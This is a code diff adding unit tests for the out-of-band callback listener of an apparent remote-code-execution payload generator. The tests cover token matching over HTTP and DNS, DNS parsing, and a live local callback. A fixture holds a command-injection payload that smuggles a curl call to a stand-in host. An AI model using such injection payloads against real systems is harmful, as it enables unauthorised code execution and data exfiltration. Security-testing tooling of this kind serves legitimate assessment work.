@@ -17,12 +17,57 @@ from pathlib import Path
 sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
 
 import rce_payload_gen  # noqa: E402
-from rce_payload_gen import RCEPayloadGenerator  # noqa: E402
+from rce_payload_gen import OOBListener, RCEPayloadGenerator  # noqa: E402
 
 
 class VersionTestCase(unittest.TestCase):
     def test_version_is_semver(self):
         self.assertRegex(rce_payload_gen.__version__, r"^\d+\.\d+\.\d+$")
+
+
+class OOBListenerTestCase(unittest.TestCase):
+    def setUp(self):
+        self.tokens = {"abc123token": {"payload": "; curl http://abc123token.oob.test/",
+                                       "category": "oob", "context": "raw"}}
+        self.listener = OOBListener(tokens=self.tokens)
+
+    def test_correlates_token_from_host(self):
+        hit = self.listener.record("http", "10.0.0.5", "abc123token.oob.test", "/")
+        self.assertEqual(hit["token"], "abc123token")
+        self.assertEqual(hit["payload"], "; curl http://abc123token.oob.test/")
+
+    def test_correlates_token_from_path_exfil(self):
+        hit = self.listener.record("http", "10.0.0.5", "", "/abc123token")
+        self.assertEqual(hit["token"], "abc123token")
+
+    def test_unknown_token_reported_without_payload(self):
+        hit = self.listener.record("dns", "10.0.0.5", "unknownlabel.oob.test", "")
+        self.assertIsNone(hit["payload"])
+        self.assertEqual(hit["token"], "unknownlabel")
+
+    def test_dns_query_is_parsed_and_answered(self):
+        def encode(name):
+            return b"".join(bytes([len(p)]) + p.encode() for p in name.split(".")) + b"\x00"
+        query = b"\x12\x34" + b"\x01\x00" + b"\x00\x01" + b"\x00\x00" * 3 + encode("abc123token.oob.test") + b"\x00\x01\x00\x01"
+        self.assertEqual(self.listener._parse_dns_qname(query), "abc123token.oob.test")
+        response = self.listener._dns_response(query)
+        self.assertEqual(response[:2], query[:2])       # same transaction id
+        self.assertEqual(response[6:8], b"\x00\x01")     # one answer
+
+    def test_live_http_callback_is_recorded(self):
+        import urllib.request
+        server = self.listener.start_http(0)
+        try:
+            port = server.server_address[1]
+            req = urllib.request.Request(f"http://127.0.0.1:{port}/",
+                                         headers={"Host": "abc123token.oob.test"})
+            urllib.request.urlopen(req, timeout=3).read()
+            import time
+            time.sleep(0.1)
+            self.assertTrue(any(h["payload"] for h in self.listener.hits))
+        finally:
+            server.shutdown()
+            server.server_close()
 
 
 class GeneratorTestCase(unittest.TestCase):
